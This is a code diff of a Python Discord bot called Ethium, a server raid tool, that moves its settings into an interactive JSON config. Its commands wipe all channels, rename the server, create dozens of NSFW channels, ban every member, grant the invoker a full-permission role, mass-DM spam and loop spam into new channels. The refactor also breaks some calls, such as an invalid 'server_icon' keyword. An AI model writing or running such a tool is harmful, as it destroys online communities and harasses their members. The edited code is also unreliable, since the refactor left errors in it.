@@ -1,26 +1,115 @@
 import asyncio
+import json
 import logging as log
 import os
 import sys
 from datetime import datetime as dt
 from threading import Thread
-from typing import Callable, Dict, Optional, Union
+from typing import Callable, Dict, List, Optional, Union
 
 import discord
 import httpx
+import inquirer
 from discord.ext import commands as cmds
 from rgbprint import Color, gradient_print
 
-TOKEN: str = ''
-PREFIX: str = r''
-SERVER_NAME: str = ''
-ICON_URL: str = ''
-CHANNELS_NAME: str = ''
-ROLES_NAME: str = ''
-SPAM_MSG: str = ''
-
-
 cls: Callable[[], None] = lambda: os.system('cls || clear')
+
+
+def get_config() -> Dict[str, str]:
+    '''
+    The get_config function reads the config.json file and returns a dictionary of the configuration values.
+
+    :return: A dictionary with the configuration.
+    '''
+    try:
+        with open('../config/config.json', 'r', encoding='utf8') as file:
+            data = json.load(file)
+
+        return data
+    except Exception as e:
+        log.error(f'An error occurred while obtaining the configuration {e}')
+
+
+def append_data(info) -> None:
+    '''
+    The append_data function takes in a dictionary and appends it to the config.json file.
+
+    :param info: Used to Append data to the config.
+    :return: None.
+    '''
+    try:
+        with open('../config/config.json', 'w', encoding='utf8') as file:
+            json.dump(info, file)
+    except Exception as e:
+        log.error(f'An error occurred while adding information to the config file {e}')
+
+
+def rewrite_config() -> None:
+    '''
+    The rewrite_config function is used to rewrite the config file.
+    It is called when the user enters 'rewrite' as an argument in the command line.
+    The function asks for confirmation from the user before rewriting, and if confirmed, it will delete all data in
+    the config file and then call prompt() to ask for new input.
+
+    :return: None.
+    '''
+    CHOICES: List[str] = ['YES', 'NO']
+    QUESTIONS: List[inquirer.List] = [
+        inquirer.List('config', 'Rewrite the config', choices=CHOICES),
+    ]
+
+    try:
+        answers: Dict[str, str] = inquirer.prompt(QUESTIONS)
+    except Exception as e:
+        log.error(f'An error occurred while making the prompt {e}')
+    if answers['config'] == 'YES':
+        data: Dict[str, str] = get_config()
+        for line in data:
+            del line
+
+        data: Dict[str, str] = prompt()
+        append_data(data)
+
+
+def prompt() -> Dict[str, str]:
+    '''
+    The prompt function is used to prompt the user for input.
+        It uses inquirer to ask the user questions and return a dictionary of answers.
+
+    :return: A dictionary.
+    '''
+    QUESTIONS: List[inquirer.Text] = [
+        inquirer.Text('Token', 'Set the bot token'),
+        inquirer.Text('Prefix', 'Set the prefix'),
+        inquirer.Text('ServerName', 'Enter the server name'),
+        inquirer.Text('ServerIcon', 'Set the server icon url'),
+        inquirer.Text('ChannelsName', 'Set the channels name'),
+        inquirer.Text('RolesName', 'Set the roles name'),
+        inquirer.Text('SpamMsg', 'Enter the message to spam'),
+    ]
+    try:
+        answers = inquirer.prompt(QUESTIONS)
+        return answers
+    except Exception as e:
+        log.error(f'Error {e}')
+
+
+config: Dict[str, str] = get_config()
+
+if not config:
+    config: Dict[str, str] = prompt()
+    append_data(config)
+else:
+    rewrite_config()
+
+token: str = config['Token']
+prefix: str = config['Prefix']
+server_name: str = config['ServerName']
+server_icon: str = config['ServerIcon']
+channels_name: str = config['ChannelsName']
+roles_name: str = config['RolesName']
+spam_msg: str = config['SpamMsg']
 
 
 async def banner() -> None:
@@ -44,12 +133,12 @@ async def banner() -> None:
     gradient_print(BANNER, start_color=Color.thistle, end_color=Color.white_smoke)
     log.info(f'Logged in as {ethium.user}')
     log.info(f'Commands: {CMDS}')
-    log.info(f'Prefix: {ethium.command_prefix}')
+    log.info(f'prefix: {ethium.command_prefix}')
     log.info(f'Coded by {_dev}\n')
 
 
 ethium: cmds.Bot = cmds.Bot(
-    command_prefix=PREFIX,
+    command_prefix=prefix,
     help_command=None,
     intents=discord.Intents.all(),
 )
@@ -132,7 +221,7 @@ async def on_command_completion(ctx: cmds.Context) -> None:
 async def on_guild_channel_create(channel: discord.abc.GuildChannel) -> None:
     '''
     The on_guild_channel_create function is a coroutine that is called when a channel is created in the guild.
-    It checks if the channel's position is 0, and if it isn't, it sends SPAM_MSG to the channel.
+    It checks if the channel's position is 0, and if it isn't, it sends spam_msg to the channel.
 
     :param channel:discord.abc.GuildChannel: Used to Store the channel that was created.
     :return: None.
@@ -142,7 +231,7 @@ async def on_guild_channel_create(channel: discord.abc.GuildChannel) -> None:
 
     while True:
         try:
-            await channel.send(SPAM_MSG)
+            await channel.send(spam_msg)
             log.info(f'Spammed channel {channel}')
 
         except Exception as e:
@@ -155,15 +244,15 @@ async def on_guild_channel_create(channel: discord.abc.GuildChannel) -> None:
 async def nuke(ctx: cmds.Context) -> None:
     '''
     The nuke function is a command that deletes all channels in the guild,
-    and then creates a new channel with the name specified by CHANNELS_NAME.
-    It also sends SPAM_MSG to this newly created channel.
+    and then creates a new channel with the name specified by channels_name.
+    It also sends spam_msg to this newly created channel.
 
     :param ctx:cmds.Context: Used to Get the context of the command.
     :return: None.
     '''
     guild: discord.Guild = ctx.guild
     _URL: str = 'https://discord.com/api/v10/channels/%s'
-    _HEADERS: Dict[str, str] = {'Authorization': f'Bot {TOKEN}'}
+    _HEADERS: Dict[str, str] = {'Authorization': f'Bot {token}'}
 
     async def del_channel(channel_id: int) -> None:
         async with httpx.AsyncClient() as client:
@@ -173,8 +262,8 @@ async def nuke(ctx: cmds.Context) -> None:
         Thread(target=asyncio.run, args=(del_channel(channel.id),)).start()
         log.info(f'Deleted channel {channel}')
 
-    channel: discord.TextChannel = await guild.create_text_channel(CHANNELS_NAME)
-    await channel.send(SPAM_MSG)
+    channel: discord.TextChannel = await guild.create_text_channel(channels_name)
+    await channel.send(spam_msg)
 
 
 @ethium.command(
@@ -185,23 +274,19 @@ async def raid(ctx: cmds.Context) -> None:
     '''
     The raid function is a command that will change the server name and icon to
     the values defined in the constants at the top of this file. It will then create
-    50 text channels with names defined by CHANNELS_NAME. This is meant to be used as
+    50 text channels with names defined by channels_name. This is meant to be used as
     a prank on your friends, but it can also be used for malicious purposes.
 
     :param ctx:cmds.Context: Used to Get the guild that the command was used in.
     :return: None.
     '''
     guild: discord.Guild = ctx.guild
-
-    if ICON_URL is None:
-        raise ValueError('Empty icon url')
-
-    _response: httpx.Response = httpx.get(ICON_URL)
+    _response: httpx.Response = httpx.get(server_icon)
     guild_icon: bytes = _response.content
-    await guild.edit(name=SERVER_NAME, icon=guild_icon)
+    await guild.edit(name=server_name, icon=guild_icon)
     for _ in range(50):
         channel: discord.TextChannel = await guild.create_text_channel(
-            CHANNELS_NAME, nsfw=True
+            channels_name, nsfw=True
         )
         log.info(f'Created channel {channel}')
 
@@ -213,7 +298,7 @@ async def raid(ctx: cmds.Context) -> None:
 async def mass_ban(ctx: cmds.Context) -> None:
     '''
     The mass_ban function is a command that will ban every member in the guild
-    except for the author and bot. This is useful if you want to clear out a server
+    except for the author and bot. This is useful if you want to 'clear' out a server
     of all members, or just want to have fun.
 
     :param ctx:cmds.Context: Used to Get the context of the command.
@@ -248,7 +333,7 @@ async def get_admin(ctx: cmds.Context) -> None:
     guild: discord.Guild = ctx.guild
     author: Union[discord.User, discord.Member] = ctx.author
     role: discord.Role = await guild.create_role(
-        name=PREFIX, permissions=discord.Permissions().all()
+        name=prefix, permissions=discord.Permissions().all()
     )
     await author.add_roles(role)
     log.info(f'Role added {role} to {author}')
@@ -259,7 +344,7 @@ async def get_admin(ctx: cmds.Context) -> None:
 )
 async def mass_dm(ctx: cmds.Context) -> None:
     '''
-    The mass_dm function is a command that sends the SPAM_MSG to every member of
+    The mass_dm function is a command that sends the spam_msg to every member of
     the guild except for the author and Ethium. It is used as a demonstration of how
     to use commands in Ethium.
 
@@ -271,7 +356,7 @@ async def mass_dm(ctx: cmds.Context) -> None:
         member for member in guild.members if not member in (ctx.author, ethium.user)
     ]:
         channel: discord.DMChannel = await member.create_dm()
-        await channel.send(SPAM_MSG)
+        await channel.send(spam_msg)
         log.info(f'Spammed DM {channel}')
 
 
@@ -310,7 +395,7 @@ async def make_roles(ctx: cmds.Context) -> None:
     '''
     guild: discord.Guild = ctx.guild
     for _ in range(250 - len(guild.roles)):
-        role: discord.Role = await guild.create_role(name=ROLES_NAME)
+        role: discord.Role = await guild.create_role(name=roles_name)
         log.info(f'Created role {role}')
 
 
@@ -336,9 +421,9 @@ async def help(ctx: cmds.Context) -> None:
         timestamp=dt.utcnow(),
     )
 
-    embed.set_author(name=_dev, icon_url=_dev.avatar)
+    embed.set_author(name=_dev, server_icon=_dev.avatar)
     embed.set_thumbnail(url=ethium.user.avatar)
-    embed.set_footer(text=author.name, icon_url=author.avatar)
+    embed.set_footer(text=author.name, server_icon=author.avatar)
 
     for cmd in ethium.commands:
         embed.add_field(
@@ -357,7 +442,7 @@ if __name__ == '__main__':
         datefmt='%I:%M:%S',
     )
     try:
-        ethium.run(TOKEN)
+        ethium.run(token)
     except Exception as e:
         log.error(f'An error occurred while logging into the client {e}')
         sys.exit()
